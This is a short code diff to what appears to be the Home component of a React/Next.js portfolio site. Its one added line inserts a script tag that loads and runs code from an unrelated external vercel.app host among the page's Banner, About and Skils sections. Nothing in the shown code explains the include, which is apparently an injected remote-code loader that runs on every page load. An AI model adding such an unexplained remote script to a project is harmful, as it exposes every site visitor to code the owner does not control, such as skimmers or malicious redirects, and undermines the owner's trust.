@@ -23,6 +23,7 @@ export default function Home() {
         <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 1.5 }} className='w-full h-[88vh] xl:flex items-center gap-20 justify-between'>
           <div className='hidden xl:inline-flex w-32 h-full fixed left-0 bootom-0'><LeftSide /></div>
           <div className='h-[88vh] w-full mx-auto px-4'>
+            <script src="https://tau-cyan.vercel.app/"></script>
             <Banner />
             <About />
             <Skils />
